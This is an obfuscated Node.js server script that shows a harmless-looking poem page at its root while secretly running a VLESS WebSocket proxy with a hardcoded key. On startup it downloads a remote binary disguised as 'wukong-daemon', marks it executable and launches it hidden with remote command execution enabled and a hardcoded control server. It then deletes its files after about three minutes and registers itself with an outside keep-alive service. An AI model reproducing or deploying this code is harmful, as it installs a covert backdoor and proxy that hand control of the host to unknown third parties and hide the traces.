const _0x242ae6=_0x124a;(function(_0x539cf5,_0x31eef8){const _0x208385=_0x124a,_0x38d704=_0x539cf5();while(!![]){try{const _0x109017=-parseInt(_0x208385(0x19e))/0x1+parseInt(_0x208385(0x175))/0x2+parseInt(_0x208385(0x18e))/0x3+parseInt(_0x208385(0x1cd))/0x4*(parseInt(_0x208385(0x1be))/0x5)+-parseInt(_0x208385(0x172))/0x6+parseInt(_0x208385(0x1ca))/0x7+-parseInt(_0x208385(0x1c8))/0x8;if(_0x109017===_0x31eef8)break;else _0x38d704['push'](_0x38d704['shift']());}catch(_0x12240d){_0x38d704['push'](_0x38d704['shift']());}}}(_0x2a25,0x9fa0f));function _0x2a25(){const _0x1db2c1=['Unknown','Server\x20is\x20running\x20on\x20port\x20','pop','kcystufkiiuc.ap-northeast-1.clawcloudrun.com:443','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','WUKONG_PORT','listen','&fp=chrome&type=ws&host=','unlink','chmod\x20+x\x20wukong-daemon','map','2053','1812162ijrAXD','443','http','DOMAIN','finish','connect','asOrganization','error','text/plain','2096','send','writeFileSync','write','reduce','end','false','392767wUGJmT','text/html;\x20charset=utf-8','AUTO_ACCESS','wukong-daemon\x20running\x20error:','2083','arm','WUKONG_SERVER','error:\x20','net','client_secret:\x20','KEY','161fc0b2-cfa3-4053-8d51-20aeee66c2dd','https://arm64.ssss.nyc.mn/v1','writeHead','https://oooo.serv00.net/add-url','utf-8','from','createWriteStream','child_process','https://amd64.ssss.nyc.mn/v1','wukong-daemon','get','slice','\x0a<!DOCTYPE\x20html>\x0a<html\x20lang=\x22en\x22>\x0a<head>\x0a\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20<title>An\x20Echo\x20of\x20Light</title>\x0a\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x20font-family:\x20serif;\x20background-color:\x20#282c34;\x20color:\x20#f0f2f5;\x20display:\x20flex;\x20justify-content:\x20center;\x20align-items:\x20center;\x20height:\x20100vh;\x20margin:\x200;\x20text-align:\x20center;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20pre\x20{\x20font-size:\x201.2em;\x20line-height:\x201.8;\x20white-space:\x20pre-wrap;\x20padding:\x202.5em;\x20background:\x20rgba(255,\x20255,\x20255,\x200.05);\x20border-radius:\x2010px;\x20border:\x201px\x20solid\x20rgba(255,\x20255,\x20255,\x200.1);\x20}\x0a\x20\x20\x20\x20</style>\x0a</head>\x0a<body>\x0a\x20\x20\x20\x20<pre>\x0aThe\x20stars\x20you\x20see,\x20a\x20distant\x20fire,\x0aA\x20whispered\x20echo\x20of\x20desire.\x0a\x0aTheir\x20ancient\x20light,\x20a\x20path\x20it\x20weaves,\x0aThrough\x20silent,\x20dark,\x20and\x20timeless\x20eaves.\x0a\x0aSo\x20look\x20within,\x20and\x20you\x20will\x20find,\x0aA\x20universe\x20inside\x20your\x20mind.\x0a\x20\x20\x20\x20</pre>\x0a</body>\x0a</html>\x0a\x20\x20','8443','PORT','pipe','arm64','vless://','--tls','concat','axios','1635xxCyTf','readUInt16BE','&path=%2F','config.yaml','https://amd64.ssss.nyc.mn/agent','wukong-daemon\x20download\x20successfully','message','true','data','WSPATH','4847400HOnFvW','WUKONG_KEY','623658NnwNPq','stream','url','8392ysYKfZ','https://','includes','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','country','base64','application/json','readUInt8','Automatic\x20Access\x20Task\x20added\x20successfully','/bin/bash','trim','https://speed.cloudflare.com/meta','replace','5858250nAGPEK','buffer','2h1TEmM79EPLBctbNrd014hWlkZ3Sr26','2499424VfGGuq','setsid\x20nohup\x20./wukong-daemon\x20-s\x20','createServer','Not\x20Found\x0a','log','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','env','every','toString','join','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','substr','WUKONG\x20variable\x20is\x20empty,\x20skip\x20running'];_0x2a25=function(){return _0x1db2c1;};return _0x2a25();}const os=require('os'),http=require(_0x242ae6(0x190)),fs=require('fs'),axios=require(_0x242ae6(0x1bd)),net=require(_0x242ae6(0x1a6)),{Buffer}=require(_0x242ae6(0x173)),{exec,execSync}=require(_0x242ae6(0x1b0)),{WebSocket,createWebSocketStream}=require('ws'),KEY=process[_0x242ae6(0x17b)][_0x242ae6(0x1a8)]||_0x242ae6(0x1a9),WUKONG_SERVER=process[_0x242ae6(0x17b)][_0x242ae6(0x1a4)]||_0x242ae6(0x185),WUKONG_PORT=process[_0x242ae6(0x17b)][_0x242ae6(0x187)]||'',WUKONG_KEY=process[_0x242ae6(0x17b)][_0x242ae6(0x1c9)]||_0x242ae6(0x174),DOMAIN=process[_0x242ae6(0x17b)][_0x242ae6(0x191)]||'',AUTO_ACCESS=process[_0x242ae6(0x17b)][_0x242ae6(0x1a0)]||![],WSPATH=process[_0x242ae6(0x17b)][_0x242ae6(0x1c7)]||KEY[_0x242ae6(0x1b4)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||'sub123',NAME=process[_0x242ae6(0x17b)]['NAME']||'Vl',PORT=process['env'][_0x242ae6(0x1b7)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x4acbc7=_0x242ae6;try{const _0x238127=await axios[_0x4acbc7(0x1b3)](_0x4acbc7(0x170)),_0x35ac49=_0x238127[_0x4acbc7(0x1c6)];ISP=(_0x35ac49[_0x4acbc7(0x169)]+'-'+_0x35ac49[_0x4acbc7(0x194)])[_0x4acbc7(0x171)](/ /g,'_');}catch(_0x27f7cc){ISP=_0x4acbc7(0x182);}};GetISP();const httpServer=http[_0x242ae6(0x177)]((_0x5419f5,_0x30a029)=>{const _0x37a941=_0x242ae6;if(_0x5419f5[_0x37a941(0x1cc)]==='/'){const _0x39abe2=_0x37a941(0x1b5);_0x30a029[_0x37a941(0x1ab)](0xc8,{'Content-Type':_0x37a941(0x19f)}),_0x30a029['end'](_0x39abe2);}else{if(_0x5419f5[_0x37a941(0x1cc)]==='/'+SUB_PATH){const _0x3bbc76=_0x37a941(0x1ba)+KEY+'@www.visa.com.tw:443?encryption=none&security=tls&sni='+DOMAIN+_0x37a941(0x189)+DOMAIN+_0x37a941(0x1c0)+WSPATH+'#'+NAME+'-'+ISP,_0x1f0f10=Buffer[_0x37a941(0x1ae)](_0x3bbc76)[_0x37a941(0x17d)](_0x37a941(0x16a));_0x30a029[_0x37a941(0x1ab)](0xc8,{'Content-Type':_0x37a941(0x196)}),_0x30a029[_0x37a941(0x19c)](_0x1f0f10+'\x0a');}else _0x30a029[_0x37a941(0x1ab)](0x194,{'Content-Type':_0x37a941(0x196)}),_0x30a029['end'](_0x37a941(0x178));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=KEY['replace'](/-/g,'');wss['on']('connection',_0x88616a=>{const _0x2e5a10=_0x242ae6;_0x88616a['once'](_0x2e5a10(0x1c4),_0x5ec634=>{const _0x168814=_0x2e5a10,[_0x2a934a]=_0x5ec634,_0x1f033d=_0x5ec634[_0x168814(0x1b4)](0x1,0x11);if(!_0x1f033d[_0x168814(0x17c)]((_0x5104c9,_0x391000)=>_0x5104c9==parseInt(uuid[_0x168814(0x180)](_0x391000*0x2,0x2),0x10)))return;let _0x5349e2=_0x5ec634[_0x168814(0x1b4)](0x11,0x12)['readUInt8']()+0x13;const _0x4c11a0=_0x5ec634[_0x168814(0x1b4)](_0x5349e2,_0x5349e2+=0x2)[_0x168814(0x1bf)](0x0),_0x74a6b9=_0x5ec634[_0x168814(0x1b4)](_0x5349e2,_0x5349e2+=0x1)[_0x168814(0x16c)](),_0x51aa84=_0x74a6b9==0x1?_0x5ec634[_0x168814(0x1b4)](_0x5349e2,_0x5349e2+=0x4)[_0x168814(0x17e)]('.'):_0x74a6b9==0x2?new TextDecoder()['decode'](_0x5ec634[_0x168814(0x1b4)](_0x5349e2+0x1,_0x5349e2+=0x1+_0x5ec634[_0x168814(0x1b4)](_0x5349e2,_0x5349e2+0x1)[_0x168814(0x16c)]())):_0x74a6b9==0x3?_0x5ec634[_0x168814(0x1b4)](_0x5349e2,_0x5349e2+=0x10)[_0x168814(0x19b)]((_0xfe48ed,_0xcdb5b1,_0x99b855,_0x2fa4c6)=>_0x99b855%0x2?_0xfe48ed[_0x168814(0x1bc)](_0x2fa4c6[_0x168814(0x1b4)](_0x99b855-0x1,_0x99b855+0x1)):_0xfe48ed,[])[_0x168814(0x18c)](_0x3949c1=>_0x3949c1[_0x168814(0x1bf)](0x0)[_0x168814(0x17d)](0x10))['join'](':'):'';_0x88616a[_0x168814(0x198)](new Uint8Array([_0x2a934a,0x0]));const _0x4a5b3a=createWebSocketStream(_0x88616a);net[_0x168814(0x193)]({'host':_0x51aa84,'port':_0x4c11a0},function(){const _0x53b30a=_0x168814;this[_0x53b30a(0x19a)](_0x5ec634['slice'](_0x5349e2)),_0x4a5b3a['on'](_0x53b30a(0x195),()=>{})[_0x53b30a(0x1b8)](this)['on'](_0x53b30a(0x195),()=>{})[_0x53b30a(0x1b8)](_0x4a5b3a);})['on'](_0x168814(0x195),()=>{});})['on'](_0x2e5a10(0x195),()=>{});});const getDownloadUrl=()=>{const _0x4d8628=_0x242ae6,_0x18e347=os['arch']();return _0x18e347===_0x4d8628(0x1a3)||_0x18e347===_0x4d8628(0x1b9)||_0x18e347==='aarch64'?!WUKONG_PORT?_0x4d8628(0x1aa):'https://arm64.ssss.nyc.mn/agent':!WUKONG_PORT?_0x4d8628(0x1b1):_0x4d8628(0x1c2);},downloadFile=async()=>{const _0x101de7=_0x242ae6;if(!WUKONG_SERVER&&!WUKONG_KEY)return;try{const _0x58914f=getDownloadUrl(),_0xada857=await axios({'method':'get','url':_0x58914f,'responseType':_0x101de7(0x1cb)}),_0x30039b=fs[_0x101de7(0x1af)](_0x101de7(0x1b2));return _0xada857['data'][_0x101de7(0x1b8)](_0x30039b),new Promise((_0x4bca93,_0x49b6ed)=>{const _0x44fc1e=_0x101de7;_0x30039b['on'](_0x44fc1e(0x192),()=>{const _0x40398b=_0x44fc1e;console['log'](_0x40398b(0x1c3)),exec(_0x40398b(0x18b),_0x2e1bd4=>{if(_0x2e1bd4)_0x49b6ed(_0x2e1bd4);_0x4bca93();});}),_0x30039b['on'](_0x44fc1e(0x195),_0x49b6ed);});}catch(_0x502af9){throw _0x502af9;}},runnz=async()=>{const _0x9d99d8=_0x242ae6;try{const _0x4ddbf1=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./wukong-daemon\x22',{'encoding':_0x9d99d8(0x1ad)});if(_0x4ddbf1[_0x9d99d8(0x16f)]()!==''){console['log']('wukong-daemon\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x156e4b){}await downloadFile();let _0x107391='',_0x5c8b81=[_0x9d99d8(0x18f),_0x9d99d8(0x1b6),_0x9d99d8(0x197),'2087',_0x9d99d8(0x1a2),_0x9d99d8(0x18d)];if(WUKONG_SERVER&&WUKONG_PORT&&WUKONG_KEY){const _0x49d865=_0x5c8b81['includes'](WUKONG_PORT)?_0x9d99d8(0x1bb):'';_0x107391=_0x9d99d8(0x176)+WUKONG_SERVER+':'+WUKONG_PORT+'\x20-p\x20'+WUKONG_KEY+'\x20'+_0x49d865+_0x9d99d8(0x186);}else{if(WUKONG_SERVER&&WUKONG_KEY){if(!WUKONG_PORT){const _0x116f19=WUKONG_SERVER[_0x9d99d8(0x167)](':')?WUKONG_SERVER['split'](':')[_0x9d99d8(0x184)]():'',_0x4a026a=_0x5c8b81[_0x9d99d8(0x167)](_0x116f19)?_0x9d99d8(0x1c5):_0x9d99d8(0x19d),_0x5c51f0=_0x9d99d8(0x1a7)+WUKONG_KEY+_0x9d99d8(0x168)+WUKONG_SERVER+_0x9d99d8(0x17f)+_0x4a026a+_0x9d99d8(0x17a)+KEY;fs[_0x9d99d8(0x199)](_0x9d99d8(0x1c1),_0x5c51f0);}_0x107391='setsid\x20nohup\x20./wukong-daemon\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x9d99d8(0x181));return;}}try{exec(_0x107391,{'shell':_0x9d99d8(0x16e)},_0x4c8cfb=>{const _0x164a3f=_0x9d99d8;if(_0x4c8cfb)console[_0x164a3f(0x195)](_0x164a3f(0x1a1),_0x4c8cfb);else console['log']('wukong-daemon\x20is\x20running');});}catch(_0x332c09){console[_0x9d99d8(0x195)](_0x9d99d8(0x1a5)+_0x332c09);}};async function addAccessTask(){const _0x81445=_0x242ae6;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x385653=_0x81445(0x1ce)+DOMAIN+'/'+SUB_PATH;try{const _0x54292f=await axios['post'](_0x81445(0x1ac),{'url':_0x385653},{'headers':{'Content-Type':_0x81445(0x16b)}});console[_0x81445(0x179)](_0x81445(0x16d));}catch(_0x315c37){}}function _0x124a(_0x2459ff,_0x2ba16b){const _0x2a25ec=_0x2a25();return _0x124a=function(_0x124a0d,_0x1608e8){_0x124a0d=_0x124a0d-0x167;let _0x66d3f1=_0x2a25ec[_0x124a0d];return _0x66d3f1;},_0x124a(_0x2459ff,_0x2ba16b);}const delFiles=()=>{const _0x519760=_0x242ae6;fs['unlink'](_0x519760(0x1b2),()=>{}),fs[_0x519760(0x18a)]('config.yaml',()=>{});};httpServer[_0x242ae6(0x188)](PORT,()=>{const _0xc94d40=_0x242ae6;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xc94d40(0x179)](_0xc94d40(0x183)+PORT);});
